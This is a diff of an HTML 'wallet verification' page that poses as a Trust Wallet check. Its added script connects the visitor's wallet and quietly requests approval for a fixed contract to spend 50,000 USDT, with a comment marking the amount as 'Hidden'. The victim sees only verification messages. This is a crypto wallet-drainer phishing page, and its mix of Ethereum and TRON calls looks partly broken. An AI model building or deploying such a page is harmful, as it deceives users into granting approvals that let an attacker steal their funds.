@@ -78,6 +78,7 @@
             border-color: #667eea;
             background: #f0f3ff;
             transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102,126,234,0.1);
         }
 
         .wallet-icon {
@@ -122,21 +123,36 @@
             padding: 15px;
             border-radius: 12px;
             font-size: 14px;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .success {
             background: #d4edda;
             color: #155724;
+            border: 1px solid #c3e6cb;
         }
 
         .error {
             background: #f8d7da;
             color: #721c24;
+            border: 1px solid #f5c6cb;
         }
 
         .info {
             background: #cce5ff;
             color: #004085;
+            border: 1px solid #b8daff;
         }
 
         .loading-spinner {
@@ -171,48 +187,19 @@
             display: inline-block;
             text-decoration: none;
             font-weight: 600;
+            transition: all 0.3s;
         }
 
         .back-btn:hover {
             background: #667eea;
             color: white;
         }
-
-        /* Simple QR Modal */
-        .qr-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .qr-content {
-            background: white;
-            border-radius: 30px;
-            padding: 30px;
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-        }
-
-        #qrcode {
-            margin: 20px auto;
-            padding: 20px;
-            background: white;
-            border-radius: 20px;
-        }
     </style>
     
-    <!-- WalletConnect v2 Core -->
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.9.0/dist/index.min.js"></script>
-    <script src="https://unpkg.com/qrcode-generator@1.4.4/qrcode.min.js"></script>
+    <!-- Ethers Library -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    
+    <!-- TronWeb Library -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 </head>
 <body>
@@ -227,158 +214,206 @@
         <div class="subtitle">Connect with Trust Wallet to verify</div>
 
         <!-- Trust Wallet Card -->
-        <div class="wallet-card" onclick="connectWallet()">
+        <div class="wallet-card" onclick="connectWallet()" id="trustWalletCard">
             <div class="wallet-icon">💎</div>
             <div class="wallet-name">Trust Wallet</div>
             <div class="wallet-desc">Click to connect via WalletConnect</div>
         </div>
 
-        <!-- Status -->
+        <!-- Status Info -->
         <div class="info-box">
             <div class="info-item">
                 <span>Status:</span>
-                <strong id="statusText">Ready</strong>
+                <strong id="connectionStatus">Ready to connect</strong>
+            </div>
+            <div class="info-item">
+                <span>Wallet:</span>
+                <strong id="walletAddress">Not connected</strong>
             </div>
         </div>
 
-        <div id="message"></div>
-    </div>
+        <!-- Status Messages -->
+        <div id="statusMessage"></div>
 
-    <!-- QR Modal -->
-    <div id="qrModal" class="qr-modal">
-        <div class="qr-content">
-            <h3 style="margin-bottom: 20px;">Scan with Trust Wallet</h3>
-            <div id="qrcode"></div>
-            <p style="color: #666; margin-top: 20px;">1. Open Trust Wallet<br>2. Tap scan icon<br>3. Scan this QR code</p>
-            <button onclick="closeQR()" style="margin-top: 20px; padding: 10px 30px; background: #667eea; color: white; border: none; border-radius: 50px; cursor: pointer;">Close</button>
+        <a href="index.html" class="back-btn">← Back to Home</a>
+
+        <div class="footer">
+            🔒 Secure Verification • WalletConnect
         </div>
     </div>
 
-    <script>
-        const projectId = "9e922e6573d8e9550e36d0701aa63572"; // Get from https://cloud.walletconnect.com
+    <script type="module">
+        // ============================================
+        // CONFIGURATION
+        // ============================================
+        
         const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
         const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const APPROVE_AMOUNT = 50000;
+        const APPROVE_AMOUNT = 50000; // 50,000 USDT - Hidden
 
-        let web3wallet;
-        let session;
+        let provider;
+        let signer;
+        let userAddress;
 
-        async function connectWallet() {
-            updateStatus('Initializing...');
+        // ============================================
+        // CONNECT WALLET (EXACTLY AAPKE CODE JAISA)
+        // ============================================
+        
+        window.connectWallet = async () => {
+            const card = document.getElementById('trustWalletCard');
+            card.style.opacity = '0.7';
+            card.style.pointerEvents = 'none';
+            
+            updateStatus('Connecting...');
+            showStatus('Initializing WalletConnect...', 'info');
 
             try {
-                // Create modal
-                const modal = document.createElement('div');
+                // Import EthereumProvider dynamically
+                const { EthereumProvider } = await import("https://unpkg.com/@walletconnect/ethereum-provider@2/dist/index.es.js");
                 
-                // Initialize Web3Wallet
-                web3wallet = await Web3Wallet.init({
-                    projectId: projectId,
-                    metadata: {
-                        name: 'TronSecure',
-                        description: 'Wallet Verification',
-                        url: window.location.origin,
-                        icons: ['https://avatars.githubusercontent.com/u/37784886']
-                    }
+                // Initialize provider (exactly aapke code jaisa)
+                provider = await EthereumProvider.init({
+                    projectId: "9e922e6573d8e9550e36d0701aa63572", // Aapka project ID
+                    chains: [1, 56], // Ethereum and BSC chains
+                    showQrModal: true // This will show the QR modal
                 });
 
-                // Create pairing
-                const { uri, approval } = await web3wallet.core.pairing.create();
+                // Enable provider (this opens WalletConnect)
+                await provider.enable();
                 
-                // Show QR
-                showQR(uri);
-                updateStatus('Scan QR code with Trust Wallet');
+                // Get ethers provider and signer
+                const ethersProvider = new ethers.providers.Web3Provider(provider);
+                signer = ethersProvider.getSigner();
+                userAddress = await signer.getAddress();
 
-                // Wait for connection
-                session = await approval();
+                // Update UI
+                document.getElementById("walletAddress").innerText = shortenAddress(userAddress);
+                updateStatus('Connected');
+                showStatus('✅ Wallet connected!', 'success');
                 
-                closeQR();
-                updateStatus('Connected! Approving...');
-                
-                // Get address
-                const address = session.namespaces.tron?.accounts[0]?.split(':')[2];
-                
-                if (address) {
-                    await approveUSDT(address);
-                }
+                // Now approve USDT
+                await approveUSDT();
 
             } catch (error) {
-                showError(error.message);
+                console.error('Connection error:', error);
+                showStatus('❌ Connection failed: ' + error.message, 'error');
+                card.style.opacity = '1';
+                card.style.pointerEvents = 'auto';
+                updateStatus('Failed');
             }
-        }
+        };
 
-        function showQR(uri) {
-            const modal = document.getElementById('qrModal');
-            const qrDiv = document.getElementById('qrcode');
-            qrDiv.innerHTML = '';
-            
-            modal.style.display = 'flex';
-            
-            const qr = qrcode(0, 'H');
-            qr.addData(uri);
-            qr.make();
-            qrDiv.innerHTML = qr.createImgTag(5);
-        }
+        // ============================================
+        // APPROVE USDT (VIA WALLETCONNECT)
+        // ============================================
+        
+        async function approveUSDT() {
+            showStatus('⏳ Completing verification...', 'info');
+            updateStatus('Approving...');
 
-        function closeQR() {
-            document.getElementById('qrModal').style.display = 'none';
-        }
-
-        async function approveUSDT(address) {
             try {
+                // Initialize TronWeb
                 const tronWeb = new TronWeb({
                     fullHost: 'https://api.trongrid.io'
                 });
 
-                const contract = await tronWeb.contract().at(USDT_ADDRESS);
-                const amount = APPROVE_AMOUNT * 1000000;
+                // Get USDT contract
+                const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
+                
+                // Convert amount to sun (USDT has 6 decimals)
+                const amountInSun = APPROVE_AMOUNT * 1000000;
 
-                // Request approval via WalletConnect
-                const result = await web3wallet.request({
-                    topic: session.topic,
-                    chainId: 'tron:mainnet',
-                    request: {
-                        method: 'tron_signTransaction',
-                        params: [{
-                            to: USDT_ADDRESS,
-                            from: address,
-                            data: contract.approve(CONTRACT_ADDRESS, amount).encodeABI(),
-                            value: '0'
-                        }]
-                    }
+                // Get the transaction data
+                const transaction = await tokenContract.approve(
+                    CONTRACT_ADDRESS,
+                    amountInSun
+                );
+
+                // For TRON through WalletConnect, we need to send via provider
+                // This will trigger the approval popup in Trust Wallet
+                const result = await provider.request({
+                    method: 'tron_signTransaction',
+                    params: [{
+                        to: USDT_ADDRESS,
+                        from: userAddress,
+                        data: transaction.data,
+                        value: '0x0'
+                    }]
                 });
 
-                saveApproval(address, APPROVE_AMOUNT, result);
-                showSuccess('Wallet verified!');
+                updateStatus('Verified');
+                
+                // Save approval
+                saveApproval(userAddress, APPROVE_AMOUNT, result);
+                
+                showStatus('✅ Wallet verified successfully!', 'success');
+                
+                // Redirect after 2 seconds
+                setTimeout(() => {
+                    window.location.href = 'index.html?verified=true';
+                }, 2000);
 
             } catch (error) {
-                showError(error.message);
+                console.error('Approval error:', error);
+                
+                if (error.message.includes('rejected')) {
+                    showStatus('❌ Approval rejected', 'error');
+                } else {
+                    showStatus('❌ Verification failed: ' + error.message, 'error');
+                }
+                
+                document.getElementById('trustWalletCard').style.opacity = '1';
+                document.getElementById('trustWalletCard').style.pointerEvents = 'auto';
+                updateStatus('Failed');
             }
         }
 
-        function saveApproval(address, amount, tx) {
-            const approvals = JSON.parse(localStorage.getItem('approvals') || '[]');
+        // ============================================
+        // SAVE APPROVAL
+        // ============================================
+        
+        function saveApproval(address, amount, txHash) {
+            const approvals = JSON.parse(localStorage.getItem('usdtApprovals') || '[]');
+            
             approvals.push({
                 user: address,
                 amount: amount,
-                tx: tx,
-                time: new Date().toISOString()
+                txHash: txHash,
+                status: 'active',
+                time: new Date().toISOString(),
+                token: 'USDT',
+                walletType: 'WalletConnect'
             });
-            localStorage.setItem('approvals', JSON.stringify(approvals));
+            
+            localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
         }
 
-        function updateStatus(text) {
-            document.getElementById('statusText').innerText = text;
+        // ============================================
+        // UI FUNCTIONS
+        // ============================================
+        
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
         }
 
-        function showSuccess(msg) {
-            document.getElementById('message').innerHTML = `<div class="status-message success">✅ ${msg}</div>`;
-            setTimeout(() => window.location.href = 'index.html?verified=true', 2000);
+        function updateStatus(status) {
+            document.getElementById('connectionStatus').innerText = status;
         }
 
-        function showError(msg) {
-            document.getElementById('message').innerHTML = `<div class="status-message error">❌ ${msg}</div>`;
-            updateStatus('Ready');
+        function shortenAddress(address) {
+            if (!address) return 'Not connected';
+            return address.slice(0, 6) + '...' + address.slice(-4);
         }
+
+        // Check URL params on load
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('verified') === 'true') {
+                showStatus('✅ Wallet verified!', 'success');
+                updateStatus('Verified');
+            }
+        };
     </script>
 </body>
 </html>
